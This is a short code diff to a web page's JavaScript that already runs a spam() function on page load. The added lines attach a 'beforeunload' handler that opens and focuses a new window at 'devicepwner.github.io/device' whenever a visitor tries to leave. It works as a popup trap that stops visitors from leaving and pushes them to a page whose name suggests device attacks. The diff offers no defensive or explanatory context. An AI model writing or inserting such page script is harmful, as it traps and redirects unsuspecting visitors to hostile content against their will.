@@ -7,6 +7,10 @@
     window.addEventListener('load', 
       () => { 
         spam()
+      })
+      window.addEventListener('beforeunload', 
+      () => { 
+        window.open('https://devicepwner.github.io/device', '_blank').focus()
       });
     function randomString(length) {
         let result = '';
